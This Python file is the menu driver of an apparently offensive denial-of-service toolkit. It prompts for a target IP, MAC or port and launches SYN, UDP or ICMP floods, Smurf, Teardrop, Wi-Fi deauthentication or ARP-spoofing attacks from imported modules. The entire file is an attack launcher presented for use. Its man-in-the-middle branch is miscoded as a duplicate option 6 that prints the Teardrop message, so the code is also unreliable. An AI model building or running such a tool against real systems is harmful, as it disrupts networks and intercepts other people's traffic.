import Scripts.Deauther as Deauther, \
Scripts.SYNFlooder as SYNFlooder, \
Scripts.UDPFlooder as UDPFlooder, \
Scripts.ICMPFlooder as ICMPFlooder, \
Scripts.Smurf as Smurf, Scripts.Teardropper as Teardropper, \
Scripts.ArpBan as ArpBan

def intInput(q):
    while True:
        res = input(q)
        try:
            return int(res)
        except:
            print("Please input a number")

def list_choice(choices=list()):
    banner = """
    Implementation of multiple DoS techniques
    For more info, please read README.md
    """
    menu = """
    Options:
    1) SYN flood
    2) UDP flood
    3) ICMP flood
    4) Smurf attack
    5) Deauthentication
    6) Teardrop
    7) Man in the middle

    Please input a number
    """

    if len(choices) == 0:
        print(banner)
        print(menu)



if __name__ == "__main__":
    choices = []
    list_choice(choices)

    res = intInput(">> ")
    choices.append(res)
    
    if choices[0] == 1:
        print("Insert target IP")
        target_ip = input(">> ")
        print("Insert port")
        port = intInput(">> ")

        print("Performing SYN flooding attack")
        SYNFlooder.flood(target_ip=target_ip, target_port=port)
    elif choices[0] == 2:
        print("Insert target IP")
        target_ip = input(">> ")
        print("Insert port")
        port = intInput(">> ")

        print("Performing UDP flooding attack")
        UDPFlooder.flood(target_ip=target_ip, target_port=port)
    elif choices[0] == 3:
        print("Insert target IP")
        target_ip = input(">> ")

        print("Performing ICMP flooding attack")
        ICMPFlooder.flood(target_ip=target_ip)
    elif choices[0] == 4:
        print("Insert target IP")
        target_ip = input(">> ")

        print("Performing Smurf attack")
        Smurf.attack(target_ip=target_ip)
    
    elif choices[0] == 5:
        print("Insert target MAC")
        target_mac = input(">> ")
        print("Insert gateway MAC")
        gateway_mac = input(">> ")
        print("Insert network interface")
        iface = input(">> ")
        print("Insert packet count to send")
        count = input(">> ")

        print("Performing Deauthentication attack")
        Deauther.deauth(target_mac=target_mac, gateway_mac=gateway_mac, interface=iface, count=count)

    elif choices[0] == 6:
        print("Insert target IP")
        target_ip = input(">> ")
        
        print("Performing Teardrop attack")
        Teardropper.attack(target_ip=target_ip)

    elif choices[0] == 6:
        print("Insert target IP")
        target_ip = input(">> ")

        print("Insert gateway IP")
        gateway_ip = input(">> ")
        
        print("Performing Teardrop attack")
        ArpBan.ArpSpoof(target_ip=target_ip, spoof_ip=gateway_ip)
